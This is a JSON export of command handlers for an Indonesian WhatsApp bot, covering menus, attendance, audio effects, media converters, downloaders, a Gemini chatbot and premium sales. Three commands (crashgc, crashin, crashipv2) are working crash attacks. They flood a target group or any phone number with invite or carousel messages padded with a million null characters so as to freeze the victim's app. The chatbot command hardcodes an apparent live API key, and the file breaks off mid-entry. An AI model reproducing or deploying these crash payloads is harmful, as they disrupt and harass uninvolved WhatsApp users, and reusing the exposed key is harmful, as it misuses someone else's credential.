[
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Informasi perintah",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, isOwner, command, isPremium }) => {\n  const PREFIX = '^[.,!]';\n  const commandsList = {};\n  \n  commands.forEach(cmd => {\n    if (cmd.dontAddCommandList === false && cmd.command !== undefined) {\n      try {\n        const match = cmd.command.toString().match(/(\\W*)([\\w\\s\\d]*)/);\n        const mmatch = match[2];\n        const handler = PREFIX.match(/\\[(\\W*)\\]/)?.[1]?.[0] || '.';\n        if (!commandsList[cmd.type]) commandsList[cmd.type] = [];\n        commandsList[cmd.type].push(handler + mmatch.trim());\n      } catch (error) {\n        console.error('Error processing command:', error);\n      }\n    }\n  });\n\n  // Gabungkan semua kategori menjadi satu pesan\n  let bodyText = '';\n  for (const category in commandsList) {\n    bodyText += `*\\`${category}\\`*\\n`;\n    commandsList[category].forEach(cmd => {\n      bodyText += `- → ${cmd}\\n`;\n    });\n    bodyText += '\\n';  // Tambahkan pemisah antar kategori\n  }\n\nawait conn.sendMessage(\nm.chat,\n{\ntext: '𝙇𝙄𝙎𝙏 𝙈𝙀𝙉𝙐\\n\\n\\n' + bodyText,\ncontextInfo: {\nexternalAdReply:{\nshowAdAttribution: true, \nrenderLargerThumbnail: true,\ncontainsAutoReply: true, \npreviewType: \"PHOTO\",\ntitle: global.botname,\nbody: global.week + ', ' + global.calender, \nmediaType: \"IMAGE\", \nsourceUrl:global.sgc,\nthumbnailUrl:'https://i.ibb.co.com/ggBtWS8/Journey-Game-Visuals-Farrukh-Abdur.jpg'\n}\n},\n},{ quoted: m });\n}",
    "on": "message",
    "command": "/^menu$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": true,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "AI chatbot.",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, command, text }) => {\n  if (!text) {\n    return m.reply(`Harap ajukan pertanyaan setelah '${command}' command.\\nContoh: '.${command} siapa penemu JavaScript?'`);\n  }\n  await conn.sendPresenceUpdate(\"composing\", m.chat);\nconst axios = require('axios');\nconst url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro:generateContent?key=AIzaSyA6jO-NadWzx50C1JhIE23H6GBRyqUsijQ`;\nconst data = {\n  contents: [\n    {\n      role: \"user\",\n      parts: [\n        {\n          text: text\n        }\n      ]\n    }\n  ],\n  systemInstruction: {\n    role: \"user\",\n    parts: [\n      {\n        text: \"Siesta, an interactive WhatsApp bot created by SatzzDev. The bot is designed to engage users with fun and useful features, providing them with interactive commands, games, and automation. It has a friendly and user-centric personality, focusing on improving user experience in group chats and individual conversations. The bot's name, 'Siesta,' reflects its calming, laid-back vibe while still being responsive and active.\"\n      }\n    ]\n  }\n};\n\naxios.post(url, data, {\n  headers: {\n    'Content-Type': 'application/json'\n  }\n})\n  .then(response => {\n m.reply(response.data.candidates[0].content.parts[0].text);\n  })\n  .catch(error => {\n    console.error('Error:', error);\n  });\n}",
    "on": "message",
    "command": "/^(ai|gemini)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Maybe Can Help",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { reply, q } = m;\n\nreply(`\n1. *APA ITU LIMIT?*\n- \\`\\`\\`Limit Merupakan batasan yang diberikan kepada pengguna dalam menggunakan fitur tertentu. Misalnya, jumlah pesan yang bisa dikirim atau perintah yang bisa digunakan.\\`\\`\\`\n\n\n2. *APA ITU GAME LIMIT?*\n- \\`\\`\\`Game Limit Merupakan Batasan yang khusus diterapkan pada penggunaan fitur game. Misalnya, jumlah permainan yang bisa dimainkan dalam sehari.\\`\\`\\`\n\n\n3. *BAGAIMANA CARA MENDAPATKAN LIMIT?*\n- \\`\\`\\`LIMIT DAN GAME LIMIT BISA KAMU BELI DENGAN BALANCE.\\`\\`\\`\n\n4. *APA ITU BALANCE?*\n- \\`\\`\\`Balance Merupakan Saldo yang dimiliki oleh pengguna\\`\\`\\`\n\n\n*\"NOTE\":*\n2. id:\n- *.buylimit* (perintah untuk membeli limit)\n-  *.buyglimit* (perintah untuk membeli game limit)\n- *.me* (perintah untuk melihat informasi pengguna)\n`)\n}",
    "on": "message",
    "command": "/help/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": true,
    "limit": false,
    "glimit": false,
    "desc": "Obrolan anonim dengan pasangan kustom",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet { q, reply } = m\n\n\nif (!q) return reply(`\\`\\`\\`Contoh: ${command} 6282xxxxx\\`\\`\\``);\nlet numberTarget = q.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\";\nvar checkTarget = await conn.onWhatsApp(numberTarget);\nif (numberTarget == m.sender) return reply(\"```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```\");\nif (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\\n\\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');\nlet id = + new Date();\nglobal.db.data.menfess[id] = {\nid,\na: m.sender,\nb: numberTarget,\nstate: \"WAITING\",\ncheck: function (who = \"\") {\nreturn [this.a, this.b].includes(who)\n},\nother: function (who = \"\") {\nreturn who === this.a ? this.b : who === this.b ? this.a : \"\"\n}\n};\nconn.sendText(m.chat, '```Menunggu konfirmasi dari target...```', global.fake);\nconn.sendButtons(numberTarget, `( *\\`MENFESS\\`* )`, '```Seseorang ingin bertukar pesan secara anonim kepada Anda. Tekan Tombol di bawah untuk menerima/menolak```', '', [{ type: 'btn', text: 'TERIMA', id: 'accept' },{ type: 'btn', text: 'TOLAK', id: 'reject' }], global.fake);\n/*conn.sendMessage(numberTarget, {\ntext: `Halo kak ${await conn.getName(numberTarget)}\\n` + '```Seseorang ingin bertukar pesan secara anonim kepada Anda. Tekan Tombol di bawah untuk menerima/menolak```',\ncontextInfo: {\nexternalAdReply: {\ntitle: \"MENFESS\",\nbody: calender,\nthumbnailUrl: \"https://androidayuda.com/wp-content/uploads/2022/10/chats-anonimos.jpg\",\nmediaType: 1,\nrenderLargerThumbnail: true\n}\n}\n}) */\n}",
    "on": "message",
    "command": "/^(menfess|menfes|confess|confes)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "mengecek absensi",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet id = m.chat\nconn.absen = conn.absen ? conn.absen : {}\nif (!(id in conn.absen)) return m.reply(`_*Tidak ada absen berlangsung digrup ini!*_\\n\\n*.mulaiabsen* - untuk memulai absen`)\nlet d = new Date\nlet date = d.toLocaleDateString('id', {\nday: 'numeric',\nmonth: 'long',\nyear: 'numeric'\n})\nlet absen = conn.absen[id][1]\nlet list = absen.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join('\\n')\nm.reply(`*「 ABSEN 」*\n\nTanggal: ${date}\n${conn.absen[id][2]}\n\n┌ *List absen:*\n│ \n│ Total: ${absen.length}\n${list}\n│ \n└────`)\n}",
    "on": "message",
    "command": "/^cekabsen$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "absen",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet id = m.chat\nconn.absen = conn.absen ? conn.absen : {}\nif (!(id in conn.absen)) return m.reply(`_*Tidak ada absen berlangsung digrup ini!*_\\n\\n*.mulaiabsen* - untuk memulai absen`)\nlet absen = conn.absen[id][1]\nconst wasVote = absen.includes(m.sender)\nif (wasVote) return m.reply('*Kamu sudah absen!*')\nabsen.push(m.sender)\nm.reply(`Done!`)\nlet d = new Date\nlet date = d.toLocaleDateString('id', {\nday: 'numeric',\nmonth: 'long',\nyear: 'numeric'\n})\nlet list = absen.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join('\\n')\nm.reply(`*「 ABSEN 」*\n\nTanggal: ${date}\n${conn.absen[id][2]}\n\n┌ *List absen:*\n│ \n│ Total: ${absen.length}\n${list}\n│ \n└────\n`)\n}",
    "on": "message",
    "command": "/^absen$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "memulai absensi",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconn.absen = conn.absen ? conn.absen : {}\nlet id = m.chat\nif (id in conn.absen) {\nm.reply(`_*Masih ada absen di chat ini!*_\\n\\n*.hapusabsen* - untuk menghapus absen`)\n}\nconn.absen[id] = [\nm.reply(`Berhasil memulai absen!\\n\\n*.absen* - untuk absen\\n*.cekabsen* - untuk mengecek absen\\n*.hapusabsen* - untuk menghapus data absen`),\n[],\nm.query\n]\n}",
    "on": "message",
    "command": "/^mulaiabsen$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": true,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "menhapus absensi",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet id = m.chat\nconn.absen = conn.absen ? conn.absen : {}\nif (!(id in conn.absen)) return m.reply(`_*Tidak ada absen berlangsung digrup ini!*_\\n\\n*${usedPrefix}mulaiabsen* - untuk memulai absen`)\ndelete conn.absen[id]\nm.reply(`Done!`)\n}",
    "on": "message",
    "command": "/^hapusabsen$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": true,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "Afk",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply,q} = m;\nlet user = global.db.data.users[m.sender];\nuser.afkTime = + new Date();\nuser.afkReason = q;\nreply(`@${m.sender.split(\"@\")[0]} kini AFK${q ? \" dengan alasan: \" + q : \"\"}`);\n}",
    "on": "message",
    "command": "/^afk$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek bass",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-af equalizer=f=54:width_type=o:width=2:g=20\");\n}",
    "on": "message",
    "command": "/^bass$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek blown",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-af acrusher=.1:1:64:0:log\");\n}",
    "on": "message",
    "command": "/^blown$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek deep",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-af atempo=4/4,asetrate=44500*2/3\");\n}",
    "on": "message",
    "command": "/^deep$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek earrape",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-af volume=12\");\n}",
    "on": "message",
    "command": "/^earrape$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi cepat",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, '-filter:a \"atempo=1.63,asetrate=44100\"');\n}",
    "on": "message",
    "command": "/^fast$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek nightcore",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-filter:a atempo=1.25,asetrate=44100*1.25\");\n}",
    "on": "message",
    "command": "/^nightcore$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi lebih cepat",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, \"-filter:a atempo=1.5\");\n}",
    "on": "message",
    "command": "/^speedup$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Mengubah audio menjadi efek reverb",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, mime, qmsg }) => {\n  await applyAudioAudioEffect(m, conn, mime, qmsg, '-af \"aecho=0.8:0.88:60:0.4\"');\n}",
    "on": "message",
    "command": "/^reverb$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, command, text}) => {\nasync function attack() {\nvar msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({\ngroupInviteMessage: {\ngroupJid: \"1234567890@g.us\",\ninviteCode: \"abcdefg\",\ninviteExpiration: Date.now() + 86400000,\ngroupName: \"Satzz 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ\" + \"\\u0000\".repeat(1000000),\njpegThumbnail: await getBuffer(\"https://i.ibb.co.com/LS0J8tV/2a705756-b25a-4c67-8496-8ebae9633e40.jpg\"),\ncaption: \"Satzz 𝗖𝗿𝗮𝘀𝗵𝗲𝗿 ϟ\",\ngroupType: 1,\n}\n}), {\nuserJid: m.chat,\nquoted: m\n})\nreturn conn.relayMessage(m.chat, msg.message, {messageId: msg.key.id})\n}\nconn.public = false\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(2000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nawait sleep(3000)\nawait attack()\nconn.public = true\n}",
    "on": "message",
    "command": "/^crashgc$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": true,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, command, text, reply}) => {\nif (!text) return reply('nomor?')\nlet numberTarget = text.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\";\nvar checkTarget = await conn.onWhatsApp(numberTarget);\nif (numberTarget == m.sender) return reply(\"```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```\");\nif (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\\n\\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');\nawait reply('prosess')\nvar msg = generateWAMessageFromContent(numberTarget, proto.Message.fromObject({\ngroupInviteMessage: {\ngroupJid: \"1234567890@g.us\",\ninviteCode: \"abcdefg\",\ninviteExpiration: Date.now() + 86400000,\ngroupName: \"Created By SatzzDev.\" + \"\\u0000\".repeat(1000000),\nthumbnail: \"SatzzDev!\\u0000\".repeat(1000000),\ncaption: \"Created By SatzzDev.\",\ngroupType: 1,\n}\n}), {userJid: numberTarget})\nawait conn.relayMessage(numberTarget, msg.message, {messageId: msg.key.id})\nawait reply('done')\n}",
    "on": "message",
    "command": "/^crashin$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": true,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async(m, {conn, command, text, reply}) => {\nif (!text) return reply('nomor?')\nlet numberTarget = text.replace(/[^0-9]/g, \"\") + \"@s.whatsapp.net\";\nvar checkTarget = await conn.onWhatsApp(numberTarget);\nif (numberTarget == m.sender) return reply(\"```Anda tidak dapat mengirim pesan ke nomor Anda sendiri!```\");\nif (checkTarget.length == 0) return reply('```Nomor tersebut tidak terdaftar di WhatsApp.\\n\\nSilakan masukkan nomor WhatsApp yang valid dan terdaftar.```');\nasync function createImageMessage(imageUrl) {\nconst { imageMessage } = await generateWAMessageContent({'image': {'url': imageUrl}}, {'upload': conn.waUploadToServer});\nreturn imageMessage;\n}\nlet results = []\nlet imageUrls = [\"https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/9ee74f6d81f77489bf0b6f542750a8e8.jpg\",\"https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/97b7fa3e43e85ff55c0ef7055f424df2.jpg\",\"https://github.com/SatganzDevs/DATABASES/raw/main/ASSETS/12a462b61dcc678aaa65091fcf976662.jpg\"]\nfor (let imageUrl of imageUrls) {\nresults.push({\n'body': proto.Message.InteractiveMessage.Body.fromObject({'text': \"\"}),\n'footer': proto.Message.InteractiveMessage.Footer.fromObject({'text': global.author }),\n'header': proto.Message.InteractiveMessage.Header.fromObject({\n'title': `No Place To Hide!`,\n'hasMediaAttachment': true,\n'imageMessage': await createImageMessage(imageUrl)\n}),\n'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({\n'buttons': [{'name': 'cta_url', 'buttonParamsJson': JSON.stringify({\"display_text\": \"Join Group\",\"url\": \"https://www.google.com\",\"merchant_url\": \"https://www.google.com\"})}]\n})\n});\n}\nconst messageContent = generateWAMessageFromContent(numberTarget, {\n'viewOnceMessage': {\n'message': {\n'messageContextInfo': {\n'deviceListMetadata': {},\n'deviceListMetadataVersion': 2\n},\n'interactiveMessage': proto.Message.InteractiveMessage.fromObject({\n'body': proto.Message.InteractiveMessage.Body.create({\n'text': \"nih\"\n}),\n'footer': proto.Message.InteractiveMessage.Footer.create({\n'text': \"Created By SatganzDevs\"\n}),\n'header': proto.Message.InteractiveMessage.Header.create({\n'hasMediaAttachment': true\n}),\n'Message': proto.Message.InteractiveMessage.CarouselMessage.fromObject({\n'cards': results\n})\n})\n}\n}\n}, {});\nawait conn.relayMessage(numberTarget, messageContent.message, {'messageId': messageContent.key.id});\nawait reply('done')\n}",
    "on": "message",
    "command": "/^crashipv2$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": false,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, { conn, isPremium, reply }) => {\n    let replyMessage = '*`PREMIUM USER`*\\n' +\n        '*Bronze*\\n' +\n        '> Rp. 0.00\\n' +\n        '> 5 Limit/Hari\\n\\n' +\n        '*Silver*\\n' +\n        '> Rp.5.000.00\\n' +\n        '> 1 Bulan Masa Aktif\\n' +\n        '> 100 Limit/Hari\\n\\n' +\n        '*Gold*\\n' +\n        '> Rp. 10.000.00\\n' +\n        '> 2 bulan Masa Aktif\\n' +\n        '> 500 Limit/Hari\\n' +\n        '> Free Fitur Request\\n\\n' +\n        '*`METODE PEMBAYARAN`*\\n' +\n        '> DANA: 082398383300\\n' +\n        '> Yuk, buruan ambil paketnya!';\n\n    conn.sendButtons(m.chat, '', replyMessage, global.author, [{type:\"btn\", text:\"Beli Sekarang!\", id:\".payment\"}], m);\n}",
    "on": "message",
    "command": "/^buyprem/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "video to audio",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, qmsg, text, mime}) => {\nif (!m.quoted) return reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption .${command\n}`);\nlet media = await conn.downloadMediaMessage(qmsg);\nlet { toAudio } = require(\"../lib/converter\");\nlet audio = await toAudio(media, \"mp4\");\nawait conn.sendMessage(m.chat, { audio: audio, mimetype: \"audio/mpeg\" },{ quoted: m }); \n}",
    "on": "message",
    "command": "/tomp3|toaud|toaudio/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "video to gif",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst {q} = m\nif (!/webp/.test(mime)) return m.reply(`Reply stiker dengan caption *${prefix + command}*`);\nlet { webp2mp4File } = require(\"../lib/uploader\");\nlet media = await conn.downloadAndSaveMediaMessage(qmsg);\nlet webpToMp4 = await webp2mp4File(media);\nawait conn.sendMessage(m.chat, { video: {url: webpToMp4.result, caption: \"Convert Webp To Video\",streamingSidecar: new Uint8Array(300),},gifPlayback: true,},{ quoted: m});\n}",
    "on": "message",
    "command": "/togif/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "sticker to image",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst {q} = m\nif (!/webp/.test(mime)) return reply(`Reply sticker dengan caption *${command}*`);\nlet media = await conn.downloadAndSaveMediaMessage(qmsg);\nlet ran = await getRandom(\".png\");\nexec(`ffmpeg -i ${media} ${ran}`, (err) => {\nfs.unlinkSync(media);\nif (err) throw err;\nlet buffer = fs.readFileSync(ran);\nconn.sendMessage(m.chat, { image: buffer}, { quoted: m });\n}); \n}",
    "on": "message",
    "command": "/^(toimg|toimage)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "video/audio to voice note",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, reply, qmsg, quoted, mime, text}) => {\nlet media = await conn.downloadMediaMessage(qmsg);\nlet { toPTT } = require(\"../lib/converter\");\nlet audio = await toPTT(media, \"mp4\");\nconn.sendMessage(m.chat, {audio: audio, ptt: true, waveform: new Uint8Array(64), mimetype: \"audio/ogg; codecs=opus\", },{ quoted: m }) \n}",
    "on": "message",
    "command": "/toptt|tovn/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "image to url",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nlet {reply} = m\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nif (!/image|video|audio|sticker|document/.test(mime)) return reply(\"No media found\");\nreply(mess.wait)\nlet media = await conn.downloadAndSaveMediaMessage(qmsg);\nconst { files: files } = await uploadUguu(media), caption = `📮 *Link:*\\n${files[0]?.url}`;\nawait conn.sendButtons(m.chat, \"DONE\", caption, author, [{type:'url',text:'Fetch Image',id:files[0]?.url},{type:'copy',text:'Copy Url',id:files[0]?.url}], m);\n}",
    "on": "message",
    "command": "/tourl/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "sticker to image",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst quoted = m.quoted ? m.quoted : m\nconst mime = (quoted.msg || quoted).mimetype || ''\nconst qmsg = (quoted.msg || quoted)\nconst {q} = m\nlet medias = await conn.downloadAndSaveMediaMessage(qmsg);\nlet ran = await webp2mp4File(medias);\nconn.sendMessage(m.chat, { video: await getBuffer(ran.result) }, { quoted: m });\n}",
    "on": "message",
    "command": "/tovid|tovideo/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://capcut.com/xxxx`)\ntry {\nlet item = await downloadCapcut(inputs),\ncap = `🔍 *[ RESULT ]*\\n\\n📢 *title:* ${item.title}\\n📝 *description:* ${item.description}\\n💡 *usage:* ${item.usage}\\n🎥 *original video URL:* ${item.originalVideoUrl}\\n`;\nawait conn.sendFile(m.chat, item.originalVideoUrl || logo, \"\", cap || \"Tidak diketahui\", m);\n} catch (e) {\nm.reply('error');\n}\n}",
    "on": "message",
    "command": "/^(capcut|capcutdl|ccdl|cc)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command}) => {\nconst {q} = m\nif (!q) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://instagram.com/reel/xxxxx`)\nconst res = await fetchJson(`https://tools.betabotz.eu.org/tools/instagramdl?url=${q}`);\nfor (let i of res.result) {\nconn.sendFileUrl(m.chat, i._url, '', m)\n}\n}",
    "on": "message",
    "command": "/^(instagram|igdl|ig)$/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "to Download Audio From Spotify",
    "type": "misc",
    "dontAddCommandList": false,
    "function": "async (m, {conn, command, text}) => {\nif (!text) return m.reply(`Penggunaan Salah! contoh penggunaan:\\n .${command} https://pinterest.com/xxxx`)\nlet res = await pindl(text)\nconsole.log(res)\nawait conn.sendMessage(m.chat, {video: {url:res.videoUrl}},{ quoted: m })\n}",
    "on": "message",
    "command": "/^pinterestdl/",
    "fromMe": false,
    "name": "Unnamed Command"
  },
  {
    "onlyOwner": false,
    "onlyPrem": false,
    "onlyGroup": false,
    "onlyAdmins": false,
    "onlyPm": false,
    "limit": true,
    "glimit": false,
    "desc": "Play audio from YouTube",
    "type": "misc",
    "dontAddCommandList": false,
